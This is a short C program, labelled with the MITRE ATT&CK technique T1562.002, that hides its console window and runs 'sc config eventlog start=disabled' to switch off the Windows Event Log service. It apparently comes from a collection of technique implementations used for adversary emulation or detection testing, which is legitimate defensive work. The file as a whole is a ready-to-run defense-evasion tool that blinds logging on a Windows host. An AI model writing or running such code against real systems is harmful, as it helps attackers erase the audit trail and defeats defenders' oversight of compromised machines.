// Link      = https://attack.mitre.org/techniques/T1562/002/
// Technique = Impair Defenses: Disable Windows Event Logging
// ID        = T1562.002
// Tactics   = Defense Evasion,

#include <windows.h>

int main() {
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)"sc config eventlog start=disabled", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

